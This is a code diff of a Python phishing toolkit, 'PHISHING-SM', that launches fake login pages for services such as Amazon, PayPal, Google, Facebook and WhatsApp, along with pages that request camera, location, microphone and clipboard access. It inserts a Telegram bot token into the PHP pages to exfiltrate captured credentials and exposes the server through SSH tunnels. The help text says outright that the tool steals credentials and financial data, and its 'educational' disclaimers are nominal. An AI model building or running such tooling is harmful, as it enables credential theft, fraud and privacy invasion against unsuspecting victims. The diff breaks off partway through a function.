@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
-PHISHING-SM Tool - Python Ultimate Version
+PHISHING-SM Tool - Python Version
 Educational penetration testing tool for authorized security testing only
-Enhanced with intelligent control system and full compatibility
 """
 
 import os
@@ -17,14 +16,9 @@ import random
 import signal
 import select
 import readline
-import json
-import tempfile
-import shutil
 from pathlib import Path
-from datetime import datetime
-from urllib.parse import urlparse
 
-# Enhanced Color codes for terminal output
+# Color codes for terminal output
 class Colors:
     RED = '\033[1;91m'
     GREEN = '\033[1;92m'
@@ -38,12 +32,9 @@ class Colors:
     BG_BLUE = '\033[44m'
     BG_YELLOW = '\033[43m'
     BG_PURPLE = '\033[45m'
-    BG_CYAN = '\033[46m'
     NC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
 
-class AdvancedPhishingTool:
+class PhishingTool:
     def __init__(self):
         self.current_token = ""
         self.php_pid = None
@@ -53,135 +44,57 @@ class AdvancedPhishingTool:
         self.user_id = ""
         self.selected_page = ""
         self.processes = []
-        self.session_file = "phishing_session.json"
-        self.log_file = "phishing_debug.log"
-        self.backup_files = []
+        self.services_running = False
         
-        # Enhanced pages database with categories
+        # Available pages with single digit numbers
         self.pages = {
-            "01": {"file": "amazon.php", "name": "Amazon", "category": "E-commerce"},
-            "02": {"file": "camera.php", "name": "Camera", "category": "Permissions"}, 
-            "03": {"file": "collection.php", "name": "Collection", "category": "Data Collection"},
-            "04": {"file": "copy.php", "name": "Copy Access", "category": "Clipboard"},
-            "05": {"file": "discord.php", "name": "Discord", "category": "Social"},
-            "06": {"file": "facebookg.php", "name": "Facebook", "category": "Social"},
-            "07": {"file": "freefire.php", "name": "Freefire", "category": "Gaming"},
-            "08": {"file": "github.php", "name": "Github", "category": "Development"},
-            "09": {"file": "google.php", "name": "Google", "category": "Services"},
-            "10": {"file": "instagram.php", "name": "Instagram", "category": "Social"},
-            "11": {"file": "location.php", "name": "Location", "category": "Permissions"},
-            "12": {"file": "microsoft.php", "name": "Microsoft", "category": "Services"},
-            "13": {"file": "netflix.php", "name": "Netflix", "category": "Streaming"},
-            "14": {"file": "paypal.php", "name": "Paypal", "category": "Financial"},
-            "15": {"file": "peace.php", "name": "Peace", "category": "Gaming"},
-            "16": {"file": "pupgmobile.php", "name": "PubgMobile", "category": "Gaming"},
-            "17": {"file": "record.php", "name": "Record", "category": "Permissions"},
-            "18": {"file": "roblox.php", "name": "Roblox", "category": "Gaming"},
-            "19": {"file": "snab.php", "name": "Snab Chat", "category": "Messaging"},
-            "20": {"file": "spotify.php", "name": "Spotify", "category": "Streaming"},
-            "21": {"file": "telegram.php", "name": "Telegram", "category": "Messaging"},
-            "22": {"file": "tiktok.php", "name": "Tiktok", "category": "Social"},
-            "23": {"file": "whatsapp.php", "name": "Whatsapp", "category": "Messaging"},
-            "24": {"file": "x.php", "name": "X (Twitter)", "category": "Social"},
-            "25": {"file": "yallalido.php", "name": "Yallalido", "category": "Regional"}
+            "1": "amazon.php",
+            "2": "camera.php", 
+            "3": "collection.php",
+            "4": "copy.php",
+            "5": "discord.php",
+            "6": "facebookg.php",
+            "7": "freefire.php",
+            "8": "github.php",
+            "9": "google.php",
+            "10": "instagram.php",
+            "11": "location.php",
+            "12": "microsoft.php",
+            "13": "netflix.php",
+            "14": "paypal.php",
+            "15": "peace.php",
+            "16": "pupgmobile.php",
+            "17": "record.php",
+            "18": "roblox.php",
+            "19": "snab.php",
+            "20": "spotify.php",
+            "21": "telegram.php",
+            "22": "tiktok.php",
+            "23": "whatsapp.php",
+            "24": "x.php",
+            "25": "yallalido.php"
         }
         
-        # Enhanced port selection with priorities
+        # Common ports for PHP server
         self.common_ports = [8080, 8081, 8082, 8083, 3333, 4444, 5555, 6666, 7777, 8888, 9999, 10000, 1337, 3000, 5000, 7000, 9000]
         
-        # SSH tunnel providers for fallback
-        self.tunnel_providers = [
-            "localhost.run",
-            "serveo.net",
-            "ngrok.com"  # Would require ngrok binary
-        ]
-        
-        # System compatibility checks
-        self.is_termux = self.check_termux()
-        self.is_kali = self.check_kali()
-        self.is_linux = sys.platform.startswith('linux')
-        
-        # Enhanced signal handling
+        # Set up signal handlers for cleanup
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
-        
-        # Initialize logging
-        self.setup_logging()
-        
-        # Load previous session if exists
-        self.load_session()
-
-    def setup_logging(self):
-        """Setup advanced logging system"""
-        try:
-            with open(self.log_file, 'w') as f:
-                f.write(f"PHISHING-SM Log - Started at {datetime.now()}\n")
-                f.write(f"System: {sys.platform}, Termux: {self.is_termux}, Kali: {self.is_kali}\n")
-        except:
-            pass
-
-    def log_event(self, event, level="INFO"):
-        """Log events with timestamp"""
-        try:
-            with open(self.log_file, 'a') as f:
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                f.write(f"[{timestamp}] [{level}] {event}\n")
-        except:
-            pass
-
-    def check_termux(self):
-        """Check if running in Termux environment"""
-        return 'com.termux' in os.environ.get('PREFIX', '')
-
-    def check_kali(self):
-        """Check if running in Kali Linux"""
-        try:
-            with open('/etc/os-release', 'r') as f:
-                content = f.read().lower()
-                return 'kali' in content
-        except:
-            return False
-
-    def load_session(self):
-        """Load previous session data"""
-        try:
-            if os.path.exists(self.session_file):
-                with open(self.session_file, 'r') as f:
-                    data = json.load(f)
-                    self.current_token = data.get('token', '')
-                    self.user_id = data.get('user_id', '')
-                self.print_color("[+] Loaded previous session", Colors.GREEN)
-        except Exception as e:
-            self.log_event(f"Failed to load session: {str(e)}", "ERROR")
-
-    def save_session(self):
-        """Save current session data"""
-        try:
-            data = {
-                'token': self.current_token,
-                'user_id': self.user_id,
-                'timestamp': datetime.now().isoformat()
-            }
-            with open(self.session_file, 'w') as f:
-                json.dump(data, f)
-        except Exception as e:
-            self.log_event(f"Failed to save session: {str(e)}", "ERROR")
 
     def signal_handler(self, signum, frame):
-        """Enhanced signal handler for graceful cleanup"""
-        self.print_color(f"\n\n{Colors.RED}[!] Received signal {signum}, performing graceful cleanup...{Colors.NC}", Colors.RED)
+        """Handle cleanup on exit signals"""
         self.cleanup()
         sys.exit(0)
 
     def print_color(self, text, color=Colors.WHITE, end="\n"):
-        """Enhanced colored printing with auto-flush"""
+        """Print colored text"""
         print(f"{color}{text}{Colors.NC}", end=end, flush=True)
 
     def print_banner(self):
-        """Enhanced banner with system detection"""
+        """Display the main banner"""
         os.system('clear')
-        banner = f"""
-{Colors.CYAN}{Colors.BOLD}
+        self.print_color("""
 ╔══════════════════════════════════════════════════════════════════════════════╗
 ║                                                                              ║
 ║  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ ███████╗██████╗   ║
@@ -199,683 +112,448 @@ class AdvancedPhishingTool:
 ║                         ╚══════╝╚═╝     ╚═╝                                 ║
 ║                                                                              ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
-{Colors.NC}"""
+""", Colors.CYAN)
         
-        print(banner)
-        
-        # System information
-        system_info = f"{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ SYSTEM INFORMATION ══════════════════════════{Colors.NC}"
-        print(system_info)
-        print(f"{Colors.CYAN}[+] System Platform: {Colors.WHITE}{sys.platform}{Colors.NC}")
-        print(f"{Colors.CYAN}[+] Termux Detected: {Colors.WHITE}{self.is_termux}{Colors.NC}")
-        print(f"{Colors.CYAN}[+] Kali Linux: {Colors.WHITE}{self.is_kali}{Colors.NC}")
-        print(f"{Colors.CYAN}[+] Python Version: {Colors.WHITE}{sys.version.split()[0]}{Colors.NC}")
-        
-        tool_info = f"{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ TOOL INFORMATION ═══════════════════════════{Colors.NC}"
-        print(tool_info)
-        print(f"{Colors.CYAN}[+] Tool: {Colors.WHITE}PHISHING-SM ULTIMATE PYTHON{Colors.NC}")
-        print(f"{Colors.CYAN}[+] Version: {Colors.WHITE}1.0 - Enhanced Edition{Colors.NC}")
-        print(f"{Colors.CYAN}[+] Coder: {Colors.WHITE}@A_Y_TR{Colors.NC}")
-        print(f"{Colors.CYAN}[+] Channel: {Colors.WHITE}https://t.me/cybersecurityTemDF{Colors.NC}")
-        print(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
-        
-        warnings = f"{Colors.YELLOW}[!] The developer is not responsible for any incorrect use of the tool{Colors.NC}"
-        print(warnings)
-        print(f"{Colors.RED}[!] PHISHING TOOL - FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY{Colors.NC}")
-        print(f"{Colors.GREEN}[+] All rights reserved: Mohamed Abu Al-Saud{Colors.NC}")
-        print(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
+        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════ TOOL INFORMATION ═══════════════════════════{Colors.NC}")
+        self.print_color(f"[+] Tool      : {Colors.WHITE}PHISHING-SM V1{Colors.NC}", Colors.CYAN)
+        self.print_color(f"[+] Version   : {Colors.WHITE}1.0{Colors.NC}", Colors.CYAN)
+        self.print_color(f"[+] Coder     : {Colors.WHITE}@A_Y_TR{Colors.NC}", Colors.CYAN)
+        self.print_color(f"[+] Channel   : {Colors.WHITE}https://t.me/cybersecurityTemDF{Colors.NC}", Colors.CYAN)
+        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
+        self.print_color("[!] The developer is not responsible for any incorrect use of the tool...", Colors.YELLOW)
+        self.print_color("[!] phishing tool..💉👻", Colors.RED)
+        self.print_color("[+] All rights reserved: Mohamed Abu Al-Saud", Colors.GREEN)
+        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
         print()
 
     def show_help(self):
-        """Enhanced help system with detailed information"""
+        """Display help information"""
         os.system('clear')
-        self.print_color(f"{Colors.BG_PURPLE}{Colors.WHITE}══════════════════════════ ENHANCED HELP SYSTEM ═══════════════════════════{Colors.NC}")
+        self.print_color(f"{Colors.BG_PURPLE}{Colors.WHITE}══════════════════════════ TOOL HELP & INFORMATION ═══════════════════════════{Colors.NC}")
+        self.print_color("""
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                           PHISHING-SM TOOL HELP                              ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║  This is a phishing tool designed to:                                        ║
+║  • Steal browser credentials and send them to a Telegram bot                 ║
+║  • Create fake registration pages for various services                       ║
+║  • Collect device information and browser data                              ║
+║  • Access wallet information and financial data                             ║
+║                                                                              ║
+║  WARNING: This tool should only be used for educational purposes            ║
+║           and authorized penetration testing.                               ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+""", Colors.CYAN)
         
-        help_sections = [
-            {
-                "title": "TOOL OVERVIEW",
-                "content": [
-                    "PHISHING-SM ULTIMATE is an advanced penetration testing tool designed for:",
-                    "• Credential harvesting through fake login pages",
-                    "• Device information collection and browser fingerprinting",
-                    "• Real-time data exfiltration to Telegram bot",
-                    "• Multi-platform compatibility (Termux, Kali Linux, Linux)"
-                ]
-            },
-            {
-                "title": "ENHANCED FEATURES",
-                "content": [
-                    "✓ Intelligent process management and auto-recovery",
-                    "✓ Session persistence and state management",
-                    "✓ Advanced error handling and logging",
-                    "✓ Multiple SSH tunnel providers with fallback",
-                    "✓ Real-time service monitoring and health checks",
-                    "✓ Automated dependency resolution",
-                    "✓ Smart token management with auto-cleanup",
-                    "✓ QR code generation and URL validation",
-                    "✓ Cross-platform compatibility layer"
-                ]
-            },
-            {
-                "title": "CONTROL SYSTEM",
-                "content": [
-                    "The tool features an intelligent control system that allows:",
-                    "• Real-time process monitoring and management",
-                    "• Service health checks and auto-restart",
-                    "• Log viewing and debugging capabilities",
-                    "• URL testing and validation",
-                    "• Graceful shutdown and cleanup"
-                ]
-            }
+        self.print_color(f"{Colors.BG_YELLOW}{Colors.WHITE}══════════════════════════ PAGES DESCRIPTION ═══════════════════════════{Colors.NC}")
+        pages_info = [
+            ("1", "Amazon", "Fake Amazon login page to steal Amazon account credentials"),
+            ("2", "Camera", "Camera access request page to gain camera permissions"),
+            ("3", "Collection", "Comprehensive device information collection"),
+            ("4", "Copy", "Accessing the last thing copied to the device's clipboard"),
+            ("5", "Discord", "Fake Discord login page to steal Discord account credentials"),
+            ("6", "Facebook", "Fake Facebook login page to steal Facebook account credentials"),
+            ("7", "Freefire", "Freefire game account login page"),
+            ("8", "Github", "Fake GitHub login page to steal developer account credentials"),
+            ("9", "Google", "Fake Google login page to steal Google account credentials"),
+            ("10", "Instagram", "Fake Instagram login page to steal Instagram account credentials"),
+            ("11", "Location", "Location access request page to obtain precise geolocation data"),
+            ("12", "Microsoft", "Fake Microsoft login page to steal Microsoft account credentials"),
+            ("13", "Netflix", "Fake Netflix login page to steal streaming service credentials"),
+            ("14", "Paypal", "Fake PayPal login page to steal financial account credentials"),
+            ("15", "Peace", "PES game login page"),
+            ("16", "PubgMobile", "PUBG Mobile account login page"),
+            ("17", "Record", "Audio recording access page to gain microphone permissions"),
+            ("18", "Roblox", "Roblox game account login page"),
+            ("19", "Snab", "Snab app phishing page"),
+            ("20", "Spotify", "Fake Spotify login page to steal music streaming credentials"),
+            ("21", "Telegram", "Fake Telegram login page to steal Telegram account credentials"),
+            ("22", "Tiktok", "Fake TikTok login page to steal social media credentials"),
+            ("23", "Whatsapp", "Fake WhatsApp login page to steal messaging app credentials"),
+            ("24", "X", "Fake X (Twitter) login page to steal social media credentials"),
+            ("25", "Yallalido", "Yalla Lido phishing page")
         ]
         
-        for section in help_sections:
-            self.print_color(f"\n{Colors.BG_CYAN}{Colors.WHITE} {section['title']} {Colors.NC}")
-            for line in section['content']:
-                self.print_color(f"  {Colors.CYAN}•{Colors.WHITE} {line}{Colors.NC}")
+        for num, name, desc in pages_info:
+            self.print_color(f"[{num}] {name:12} - {desc}", Colors.GREEN)
         
-        self.print_color(f"\n{Colors.BG_YELLOW}{Colors.WHITE} ADVANCED USAGE {Colors.NC}")
-        usage_info = [
-            f"{Colors.GREEN}1.{Colors.WHITE} Configure Telegram bot token and user ID",
-            f"{Colors.GREEN}2.{Colors.WHITE} Select phishing page from the menu",
-            f"{Colors.GREEN}3.{Colors.WHITE} Tool automatically starts PHP server and SSH tunnel",
-            f"{Colors.GREEN}4.{Colors.WHITE} Monitor services using the interactive control panel",
-            f"{Colors.GREEN}5.{Colors.WHITE} Use generated URL for testing",
-            f"{Colors.GREEN}6.{Colors.WHITE} All credentials are sent to your Telegram bot automatically"
-        ]
-        
-        for line in usage_info:
-            print(line)
-        
-        self.print_color(f"\n{Colors.BG_RED}{Colors.WHITE} LEGAL AND ETHICAL WARNING {Colors.NC}")
-        warnings = [
-            f"{Colors.RED}⚠{Colors.WHITE} This tool is for educational purposes only",
-            f"{Colors.RED}⚠{Colors.WHITE} Use only on systems you own or have explicit permission to test",
-            f"{Colors.RED}⚠{Colors.WHITE} Compliance with local laws and regulations is mandatory",
-            f"{Colors.RED}⚠{Colors.WHITE} Developer is not responsible for any misuse or damage"
-        ]
-        
-        for line in warnings:
-            print(line)
+        self.print_color(f"\n{Colors.BG_RED}{Colors.WHITE}══════════════════════════ LEGAL WARNING ═══════════════════════════{Colors.NC}")
+        self.print_color("[!] This tool is for educational and authorized testing only", Colors.RED)
+        self.print_color("[!] Misuse of this tool is illegal and strictly prohibited", Colors.RED)
+        self.print_color("[!] Developer is not responsible for any misuse or damage", Colors.RED)
         
         input(f"\n{Colors.YELLOW}[!] Press any key to return to main menu...{Colors.NC}")
 
-    def animated_loading(self, text, duration=2, steps=20):
-        """Enhanced loading animation with progress"""
-        spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
-        step_duration = duration / steps
+    def show_loading(self, text, delay=0.1):
+        """Show loading animation"""
+        spin_chars = ['|', '/', '-', '\\']
+        i = 0
+        self.print_color(f"[+] {text} ", Colors.CYAN, end="")
         
-        self.print_color(f"{Colors.CYAN}[+]{Colors.NC} {text} ", end="")
-        
-        for i in range(steps):
-            self.print_color(f"{Colors.YELLOW}{spinner[i % len(spinner)]}{Colors.NC}", end="")
+        # Simple animation - in real implementation you'd track the actual process
+        for _ in range(10):
+            self.print_color(spin_chars[i], Colors.YELLOW, end="")
             sys.stdout.flush()
-            time.sleep(step_duration)
+            time.sleep(delay)
             self.print_color("\b", end="")
+            i = (i + 1) % 4
         
         self.print_color(f"{Colors.GREEN}✓{Colors.NC}")
 
     def check_dependencies(self):
-        """Enhanced dependency checking with intelligent installation"""
-        self.print_color(f"{Colors.CYAN}[+] Starting advanced dependency check...{Colors.NC}")
+        """Check and install required dependencies"""
+        self.print_color("[+] Checking and installing dependencies...", Colors.CYAN)
         
-        # Categorized dependencies
-        dependencies = {
-            "critical": ["php", "ssh"],
-            "important": ["curl", "wget"],
-            "optional": ["qrencode", "tmux", "ngrok"]
-        }
+        required_deps = ["php", "ssh", "curl"]
+        optional_deps = ["qrencode", "tmux"]
         
-        all_deps = []
-        for category in dependencies.values():
-            all_deps.extend(category)
+        missing_required = []
+        missing_optional = []
         
-        # Check what's available
-        available = {}
-        missing = {}
+        for dep in required_deps:
+            if self.check_command_exists(dep):
+                self.print_color(f"[+] Found: {dep}", Colors.GREEN)
+            else:
+                self.print_color(f"[-] Missing required: {dep}", Colors.RED)
+                missing_required.append(dep)
         
-        for category, deps in dependencies.items():
-            available[category] = []
-            missing[category] = []
-            
-            for dep in deps:
-                if self.check_command_exists(dep):
-                    available[category].append(dep)
-                    self.print_color(f"{Colors.GREEN}[✓] {dep:12} - Available{Colors.NC}")
-                else:
-                    missing[category].append(dep)
-                    color = Colors.RED if category == "critical" else Colors.YELLOW
-                    self.print_color(f"{color}[-] {dep:12} - Missing ({category}){Colors.NC}")
+        for dep in optional_deps:
+            if self.check_command_exists(dep):
+                self.print_color(f"[+] Found: {dep}", Colors.GREEN)
+            else:
+                self.print_color(f"[-] Missing optional: {dep}", Colors.YELLOW)
+                missing_optional.append(dep)
         
-        # Handle missing dependencies
-        if missing["critical"]:
-            self.print_color(f"{Colors.RED}[!] Critical dependencies missing: {', '.join(missing['critical'])}{Colors.NC}")
-            self.print_color(f"{Colors.YELLOW}[!] Attempting automatic installation...{Colors.NC}")
-            
-            if not self.install_dependencies(missing["critical"]):
-                self.print_color(f"{Colors.RED}[ERROR] Failed to install critical dependencies{Colors.NC}")
+        if missing_required:
+            self.print_color("[!] Installing missing dependencies...", Colors.YELLOW)
+            if not self.install_dependencies(missing_required + missing_optional):
                 return False
         
-        if missing["important"]:
-            self.print_color(f"{Colors.YELLOW}[!] Important dependencies missing: {', '.join(missing['important'])}{Colors.NC}")
-            self.install_dependencies(missing["important"])
-        
-        if missing["optional"]:
-            self.print_color(f"{Colors.CYAN}[!] Optional dependencies missing: {', '.join(missing['optional'])}{Colors.NC}")
-            self.print_color(f"{Colors.CYAN}[!] These are nice to have but not required{Colors.NC}")
-        
-        self.print_color(f"{Colors.GREEN}[+] Dependency check completed successfully{Colors.NC}")
+        self.print_color("[+] All dependencies are ready.", Colors.GREEN)
         return True
 
     def check_command_exists(self, command):
-        """Enhanced command existence check"""
-        try:
-            if command == "php":
-                # Check PHP version and capabilities
-                result = subprocess.run(["php", "-v"], capture_output=True, text=True, timeout=5)
-                return result.returncode == 0
-            elif command == "ssh":
-                result = subprocess.run(["ssh", "-V"], capture_output=True, text=True, timeout=5)
-                return result.returncode == 0
-            else:
-                return subprocess.call(f"command -v {command}", shell=True, 
-                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
-        except:
-            return False
+        """Check if a command exists in system PATH"""
+        return subprocess.call(f"command -v {command}", shell=True, 
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
 
     def install_dependencies(self, dependencies):
-        """Enhanced dependency installation with multiple package managers"""
-        self.print_color(f"{Colors.YELLOW}[!] Installing dependencies: {', '.join(dependencies)}{Colors.NC}")
+        """Install system dependencies"""
+        package_managers = {
+            'apt-get': ['apt-get', 'update', '-y'],
+            'yum': ['yum', 'update', '-y'], 
+            'pacman': ['pacman', '-Sy', '--noconfirm'],
+            'brew': ['brew', 'update']
+        }
         
-        package_managers = [
-            {
-                "name": "apt-get",
-                "update": ["apt-get", "update"],
-                "install": ["apt-get", "install", "-y"],
-                "check": ["apt-get", "--version"]
-            },
-            {
-                "name": "yum", 
-                "update": ["yum", "update", "-y"],
-                "install": ["yum", "install", "-y"],
-                "check": ["yum", "--version"]
-            },
-            {
-                "name": "pacman",
-                "update": ["pacman", "-Sy"],
-                "install": ["pacman", "-S", "--noconfirm"],
-                "check": ["pacman", "--version"]
-            },
-            {
-                "name": "brew",
-                "update": ["brew", "update"],
-                "install": ["brew", "install"],
-                "check": ["brew", "--version"]
-            },
-            {
-                "name": "pkg",  # Termux
-                "update": ["pkg", "update"],
-                "install": ["pkg", "install", "-y"],
-                "check": ["pkg", "--version"]
-            }
-        ]
-        
-        for pm in package_managers:
-            if self.check_command_exists(pm["check"][0]):
-                self.print_color(f"{Colors.GREEN}[+] Using package manager: {pm['name']}{Colors.NC}")
-                
+        for manager, update_cmd in package_managers.items():
+            if self.check_command_exists(manager.split()[0]):
                 try:
                     # Update package lists
-                    self.print_color(f"{Colors.YELLOW}[!] Updating package lists...{Colors.NC}")
-                    subprocess.run(pm["update"], check=True, capture_output=True)
+                    self.print_color(f"[!] Updating package lists with {manager}...", Colors.YELLOW)
+                    subprocess.run(update_cmd, check=True, capture_output=True)
                     
                     # Install dependencies
-                    install_cmd = pm["install"] + dependencies
-                    self.print_color(f"{Colors.YELLOW}[!] Executing: {' '.join(install_cmd)}{Colors.NC}")
+                    install_cmd = []
+                    if manager == 'apt-get':
+                        install_cmd = ['apt-get', 'install', '-y']
+                    elif manager == 'yum':
+                        install_cmd = ['yum', 'install', '-y']
+                    elif manager == 'pacman':
+                        install_cmd = ['pacman', '-S', '--noconfirm']
+                    elif manager == 'brew':
+                        install_cmd = ['brew', 'install']
                     
-                    process = subprocess.run(install_cmd, capture_output=True, text=True)
-                    if process.returncode == 0:
-                        self.print_color(f"{Colors.GREEN}[+] Successfully installed dependencies{Colors.NC}")
-                        return True
-                    else:
-                        self.print_color(f"{Colors.RED}[-] Installation failed with {pm['name']}{Colors.NC}")
-                        continue
-                        
+                    install_cmd.extend(dependencies)
+                    subprocess.run(install_cmd, check=True, capture_output=True)
+                    self.print_color("[+] Dependencies installed successfully", Colors.GREEN)
+                    return True
+                    
                 except subprocess.CalledProcessError as e:
-                    self.print_color(f"{Colors.RED}[-] Package manager error: {str(e)}{Colors.NC}")
-                    continue
-                except Exception as e:
-                    self.print_color(f"{Colors.RED}[-] Installation error: {str(e)}{Colors.NC}")
-                    continue
+                    self.print_color(f"[-] Failed to install dependencies with {manager}", Colors.RED)
+                    return False
         
-        self.print_color(f"{Colors.RED}[ERROR] Could not install dependencies automatically{Colors.NC}")
-        self.print_color(f"{Colors.YELLOW}[!] Please install manually: {', '.join(dependencies)}{Colors.NC}")
+        self.print_color("[-] Cannot install dependencies automatically", Colors.RED)
+        self.print_color(f"[!] Please install manually: {' '.join(dependencies)}", Colors.YELLOW)
         return False
 
     def validate_token(self, token):
-        """Enhanced token validation with detailed feedback"""
-        if not token or len(token) < 40:
-            self.print_color(f"{Colors.RED}[-] Token too short (minimum 40 characters){Colors.NC}", Colors.RED)
-            return False
-        
-        if not re.match(r'^[0-9]{8,10}:[a-zA-Z0-9_-]{35,}$', token):
-            self.print_color(f"{Colors.RED}[-] Invalid token format{Colors.NC}", Colors.RED)
-            self.print_color(f"{Colors.YELLOW}[!] Expected format: 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789{Colors.NC}", Colors.YELLOW)
-            return False
-        
-        # Test token with Telegram API
-        self.print_color(f"{Colors.CYAN}[+] Validating token with Telegram API...{Colors.NC}", Colors.CYAN)
-        try:
-            response = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
-            if response.status_code == 200:
-                self.print_color(f"{Colors.GREEN}[✓] Token is valid and active{Colors.NC}", Colors.GREEN)
-                return True
-            else:
-                self.print_color(f"{Colors.RED}[-] Token validation failed (HTTP {response.status_code}){Colors.NC}", Colors.RED)
-                return False
-        except Exception as e:
-            self.print_color(f"{Colors.YELLOW}[!] Could not validate token online: {str(e)}{Colors.NC}", Colors.YELLOW)
-            self.print_color(f"{Colors.YELLOW}[!] Continuing with format validation only{Colors.NC}", Colors.YELLOW)
+        """Validate Telegram bot token format"""
+        if len(token) > 40 and re.match(r'^[0-9]{8,10}:[a-zA-Z0-9_-]{35,}$', token):
             return True
+        return False
 
     def validate_id(self, user_id):
-        """Enhanced user ID validation"""
-        if not user_id.isdigit():
-            self.print_color(f"{Colors.RED}[-] User ID must contain only numbers{Colors.NC}", Colors.RED)
-            return False
-        
-        if len(user_id) < 5:
-            self.print_color(f"{Colors.RED}[-] User ID too short (minimum 5 digits){Colors.NC}", Colors.RED)
-            return False
-        
-        if len(user_id) > 15:
-            self.print_color(f"{Colors.RED}[-] User ID too long (maximum 15 digits){Colors.NC}", Colors.RED)
-            return False
-        
-        self.print_color(f"{Colors.GREEN}[✓] User ID format is valid{Colors.NC}", Colors.GREEN)
-        return True
-
-    def create_backup(self):
-        """Create backup of PHP files before modification"""
-        self.print_color(f"{Colors.CYAN}[+] Creating backup of PHP files...{Colors.NC}")
-        backup_dir = "php_backup_" + datetime.now().strftime("%Y%m%d_%H%M%S")
-        os.makedirs(backup_dir, exist_ok=True)
-        
-        for php_file in Path('.').glob('*.php'):
-            try:
-                shutil.copy2(php_file, os.path.join(backup_dir, php_file.name))
-                self.backup_files.append(php_file)
-            except Exception as e:
-                self.print_color(f"{Colors.RED}[-] Failed to backup {php_file}: {str(e)}{Colors.NC}")
-        
-        self.print_color(f"{Colors.GREEN}[+] Backup created in: {backup_dir}{Colors.NC}")
+        """Validate Telegram user ID"""
+        return user_id.isdigit() and len(user_id) >= 5
 
     def search_and_replace_token(self, token):
-        """Enhanced token replacement with backup and validation"""
-        self.print_color(f"{Colors.CYAN}[+] Starting advanced token replacement...{Colors.NC}")
-        
-        # Create backup first
-        self.create_backup()
+        """Replace token placeholder in PHP files"""
+        self.print_color("[+] Searching for BBOTTTTTTTTTTT in PHP files...", Colors.CYAN)
         
         updated_files = 0
-        total_files = 0
-        replacement_stats = {}
+        php_files = list(Path('.').glob('*.php'))
         
-        for php_file in Path('.').glob('*.php'):
-            total_files += 1
+        for php_file in php_files:
             try:
                 with open(php_file, 'r', encoding='utf-8', errors='ignore') as f:
                     content = f.read()
                 
-                original_content = content
-                replacements = 0
-                
-                # Multiple replacement patterns
-                patterns = [
-                    r'BBOTTTTTTTTTTT',
-                    r'YOUR_BOT_TOKEN',
-                    r'BOT_TOKEN',
-                    r'TELEGRAM_BOT_TOKEN'
-                ]
-                
-                for pattern in patterns:
-                    if pattern in content:
-                        content = content.replace(pattern, token)
-                        replacements += content.count(token) - original_content.count(token)
-                
-                if replacements > 0:
+                if 'BBOTTTTTTTTTTT' in content:
+                    self.print_color(f"[+] Found BBOTTTTTTTTTTT in: {php_file}", Colors.YELLOW)
+                    content = content.replace('BBOTTTTTTTTTTT', token)
+                    
                     with open(php_file, 'w', encoding='utf-8') as f:
                         f.write(content)
                     
                     # Verify replacement
-                    with open(php_file, 'r', encoding='utf-8') as f:
+                    with open(php_file, 'r', encoding='utf-8', errors='ignore') as f:
                         if token in f.read():
+                            self.print_color(f"[✓] Successfully updated: {php_file}", Colors.GREEN)
                             updated_files += 1
-                            replacement_stats[php_file.name] = replacements
-                            self.print_color(f"{Colors.GREEN}[✓] {php_file}: {replacements} replacements{Colors.NC}")
                         else:
-                            self.print_color(f"{Colors.RED}[-] Verification failed for {php_file}{Colors.NC}")
-                
+                            self.print_color(f"[-] Token not found in: {php_file} after replacement", Colors.RED)
             except Exception as e:
-                self.print_color(f"{Colors.RED}[-] Error processing {php_file}: {str(e)}{Colors.NC}")
+                self.print_color(f"[-] Error processing {php_file}: {str(e)}", Colors.RED)
         
-        # Summary
-        self.print_color(f"\n{Colors.BG_GREEN}{Colors.WHITE} TOKEN REPLACEMENT SUMMARY {Colors.NC}")
-        self.print_color(f"{Colors.CYAN}[+] Files processed: {total_files}{Colors.NC}")
-        self.print_color(f"{Colors.CYAN}[+] Files updated: {updated_files}{Colors.NC}")
-        self.print_color(f"{Colors.CYAN}[+] Total replacements: {sum(replacement_stats.values())}{Colors.NC}")
+        if updated_files == 0:
+            self.print_color("[!] No files containing BBOTTTTTTTTTTT were found", Colors.YELLOW)
         
-        if replacement_stats:
-            self.print_color(f"{Colors.CYAN}[+] Replacement details:{Colors.NC}")
-            for file, count in replacement_stats.items():
-                self.print_color(f"    {Colors.WHITE}{file}: {count} replacements{Colors.NC}")
-        
+        self.print_color(f"[+] Total files updated: {updated_files}", Colors.GREEN)
         return updated_files > 0
 
     def revert_token(self):
-        """Enhanced token reversion with smart detection"""
+        """Revert token changes in PHP files"""
         if not self.current_token:
-            self.print_color(f"{Colors.YELLOW}[!] No token to revert{Colors.NC}")
             return
         
-        self.print_color(f"{Colors.CYAN}[+] Starting intelligent token reversion...{Colors.NC}")
-        
+        self.print_color("[+] Reverting token in PHP files...", Colors.CYAN)
         reverted_files = 0
-        scanned_files = 0
         
         for php_file in Path('.').glob('*.php'):
-            scanned_files += 1
             try:
                 with open(php_file, 'r', encoding='utf-8', errors='ignore') as f:
                     content = f.read()
                 
                 if self.current_token in content:
-                    self.print_color(f"{Colors.YELLOW}[+] Reverting token in: {php_file}{Colors.NC}")
-                    
